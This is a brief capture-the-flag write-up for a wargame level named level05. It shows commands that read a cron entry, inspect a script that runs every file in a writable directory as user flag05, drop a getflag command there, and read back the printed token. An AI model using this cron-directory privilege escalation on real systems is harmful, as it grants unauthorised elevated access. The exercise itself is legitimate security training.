- `cat /var/mail/level05`
```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
- `cat /usr/sbin/openarenaserver`
```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
- `echo "getflag > /tmp/lol" > /opt/openarenaserver/run`
- `cat /tmp/lol`
```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
